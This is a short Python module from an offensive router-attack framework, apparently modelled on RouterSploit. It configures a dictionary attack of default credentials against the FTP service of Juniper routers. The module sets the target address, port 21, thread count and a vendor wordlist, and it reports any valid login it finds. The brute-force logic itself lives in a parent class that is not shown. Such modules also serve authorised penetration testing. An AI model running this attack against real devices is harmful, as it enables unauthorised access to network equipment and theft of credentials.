from routerxpl.core.exploit import *
from routerxpl.modules.creds.generic.ftp_default import Exploit as FTPDefault


class Exploit(FTPDefault):
    __info__ = {
        "name": "Juniper Router Default FTP Creds",
        "description": "Module performs dictionary attack against Juniper Router FTP service. "
                       "If valid credentials are foundm they are displayed to the user.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
        "devices": (
            "Juniper Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("file://wordlists/vendors/juniper_defaults.txt", "User:Pass or file with default credentials (file://)")
